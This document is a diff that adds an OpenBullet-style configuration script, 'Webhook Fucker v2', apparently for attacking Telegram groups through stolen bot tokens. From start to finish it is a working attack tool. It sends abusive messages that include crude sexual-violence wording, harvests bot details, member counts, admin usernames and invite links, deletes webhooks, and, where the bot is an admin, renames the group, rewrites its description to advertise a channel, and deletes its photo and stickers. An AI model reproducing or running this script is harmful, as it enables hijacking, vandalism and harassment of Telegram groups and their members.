@@ -1,0 +1,225 @@
+[SETTINGS]
+{
+  "Name": "⚡️ 𝑊𝑒𝑏𝘩𝑜𝑜𝑘 𝐹𝑢𝑐𝑘𝑒𝑟 𝑣𝟸⚡️",
+  "SuggestedBots": 30,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-16T16:50:47.0976107-07:00",
+  "AdditionalInfo": "#AntiHitstealer",
+  "Author": "MrBlackX",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+## USELESS
+SET VAR "COMBO" "<USER>:<PASS>"
+## CONFIGURATION
+SET VAR "GETINFO" "1" ## Get bot info
+SET VAR "DELWEBHOOK" "0" ## Deletes Webhook 
+SET VAR "GETINVITE" "1" ## Get Invite Link Of Group
+SET VAR "TROLLING" "1" ## Trolls Group If Has Admin
+## MESSAGES 
+SET VAR "1" "😡 HITSTEALER AREN'T COOL 😡%0A🔱 WEBHOOK FUCKER v2 🔱%0A👑 @F4C3R100 (TELEGRAM) 👑"
+SET VAR "2" "🛡 HELLO ME FROM INDIA 🛡%0A🔱 WEBHOOK FUCKER V2 🔱%0A👑 @F4C3R100 (TELEGRAM) 👑"
+SET VAR "3" "🤖 RAPING BOT...PENIS! 🤖%0A🔱 WEBHOOK FUCKER V2 🔱%0A👑 @F4C3R100 (TELEGRAM) 👑"
+SET VAR "4" "🕵️‍♂️ <ua>... mommy he is spoofing his useragent!!!🕵️‍♂️%0A🔱 WEBHOOK FUCKER V2 🔱%0A👑 @F4C3R100 (TELEGRAM) 👑"
+SET VAR "5" "🚫 Uh-ah, don't steal hits bitch. 🚫%0A🔱 WEBHOOK FUCKER V2 🔱%0A👑 @F4C3R100 (TELEGRAM) 👑"
+SET VAR "wow" "<1>|<2>|<3>|<4>|<5>"
+## SCRIPT
+
+#RandomUA FUNCTION GetRandomUA -> VAR "ua" 
+
+#URL UTILITY File "Boturl.txt" Read -> VAR "url" 
+
+#ChatId PARSE "<url>" LR "chat_id=" "&" -> VAR "chat_id" 
+
+#Split UTILITY Variable "wow" Split "|" -> VAR "texts" 
+
+#Message UTILITY List "texts" Random -> VAR "message" 
+
+#Fuck REQUEST GET "<url><message>" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK BanOn4XX=TRUE 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" EqualTo "200" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" EqualTo "Too Many Requests" 
+
+## GET INFO FROM BOT 
+IF "<GETINFO>" EqualTo "1"
+
+#Botname PARSE "<SOURCE>" JSON "first_name" CreateEmpty=FALSE -> CAP "Bot-Name" 
+
+#Username PARSE "<SOURCE>" JSON "username" -> VAR "Temp" 
+
+SET CAP "Username" "@<Temp>"
+
+#Split UTILITY Variable "url" Split "/" -> VAR "out" 
+
+SET VAR "url" "<out[0]>//<out[2]>/<out[3]>/getMe"
+
+#Me REQUEST GET "<url>" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Bot-ID PARSE "<SOURCE>" JSON "id" CreateEmpty=FALSE -> CAP "ID" 
+
+#JoinGroup PARSE "<SOURCE>" JSON "can_join_groups" CreateEmpty=FALSE -> CAP "Join-Group" 
+
+#ReadGroup PARSE "<SOURCE>" JSON "can_read_all_group_messages" CreateEmpty=FALSE -> CAP "Read-Group" 
+
+## GET USERS
+
+#ChatUsers REQUEST GET "<out[0]>//<out[2]>/<out[3]>/getChatMembersCount?chat_id=<chat_id>" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Members PARSE "<SOURCE>" JSON "result" CreateEmpty=FALSE -> CAP "Members" 
+
+#GetAdmin REQUEST GET "<out[0]>//<out[2]>/<out[3]>/getChatAdministrators?chat_id=<chat_id>" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Admins PARSE "<SOURCE>" JSON "username" Recursive=TRUE CreateEmpty=FALSE -> CAP "Admins" 
+
+ENDIF
+IF "<DELWEBHOOK>" EqualTo "1"
+
+#DeleteWebhook REQUEST GET "<out[0]>//<out[2]>/<out[3]>/deleteWebhook" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<RESPONSECODE>" EqualTo "200"
+SET CAP "WEBHOOK_RESULT" "Removed (✅)"
+ELSE
+SET CAP "WEBHOOK_RESULT" "Not Removed (❌)"
+ELSE
+SET CAP "WEBHOOK_RESULT" "Disabled (❌)"
+ENDIF
+IF "<GETINVITE>" EqualTo "1"
+
+#GetChatLink REQUEST GET "<out[0]>//<out[2]>/<out[3]>/exportChatInviteLink?chat_id=<chat_id>" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "can't invite members to a private chat"
+SET CAP "LINK" "Private Chat (❌)"
+ENDIF
+IF "<SOURCE>" Contains "not enough rights to manage chat invite link"
+SET CAP "LINK" "Not Admin (❌)"
+ENDIF
+IF "<SOURCE>" Contains "https://t.me/joinchat"
+
+#Link PARSE "<SOURCE>" JSON "result" -> CAP "LINK" 
+
+ENDIF
+IF "<TROLLING>" EqualTo "1"
+
+#SetTitle REQUEST GET "<out[0]>//<out[2]>/<out[3]>/setChatTitle?chat_id=<chat_id>&title=💟 F4c3R's Webhook Fucker 💟" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<RESPONSECODE>" EqualTo "200"
+SET CAP "TITLE" "💟 F4c3R's Webhook Fucker 💟" 
+ENDIF
+IF "<RESPONSECODE>" EqualTo "400"
+SET CAP "TITLE" "Not Admin (❌)"
+ENDIF
+
+#SetDescript REQUEST GET "<out[0]>//<out[2]>/<out[3]>/setChatDescription?chat_id=<chat_id>&description=Join https://t.me/viperzcrew for real shit mfs😂" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<RESPONSECODE>" EqualTo "200"
+SET CAP "DESCRIPT" "Join https://t.me/viperzcrew for real shit mfs😂"
+ENDIF
+IF "<RESPONSECODE>" EqualTo "400"
+SET CAP "DESCRIPT" "Not Admin (❌)"
+ENDIF
+
+#DeletePhoto REQUEST GET "<out[0]>//<out[2]>/<out[3]>/deleteChatPhoto?chat_id=<chat_id>" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<RESPONSECODE>" EqualTo "200"
+SET CAP "PHOTO" "Removed (✅)"
+ENDIF
+IF "<RESPONSECODE>" EqualTo "400"
+SET CAP "PHOTO" "Not Removed (❌)"
+ENDIF
+
+#DeleteSticker REQUEST GET "<out[0]>//<out[2]>/<out[3]>/deleteChatStickerSet?chat_id=<chat_id>" 
+  
+  HEADER "User-Agent: <ua>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<RESPONSECODE>" EqualTo "200"
+SET CAP "STICKER" "Removed (✅)"
+ENDIF
+IF "<RESPONSECODE>" EqualTo "400"
+SET CAP "STICKER" "Not Removed (❌)"
+ENDIF
+ENDIF
+
+#Information UTILITY File "Hitstealer-Info.txt" WriteLines "~ ~ ~ ~ < 💚 H I T S T E A L E R 💚 > ~ ~ ~ ~\\n\\n🤖 Bot-Name : <Bot-Name>\\n📛 Username : <Username>\\n🆔 ID : <ID>\\n🔰 Join Group : <Join-Group>\\n📖 Read Group : <Read-Group>\\n🌐 Group Link : <LINK>\\n👥 Members : <Members>\\n🦸‍♂️ Admins : <Admins>\\n❌ Webhook : <WEBHOOK_RESULT>\\n📃 Description : <DESCRIPT>\\n🔱 Title : <TITLE>\\n📷 Photo : <PHOTO>\\n🧖 Sticker : <STICKER>\\n⚡️ Made By F4c3100 ⚡️\\n\\n~ ~ ~ ~ < 💚 F U C K E R 💚 > ~ ~ ~ ~" 
+
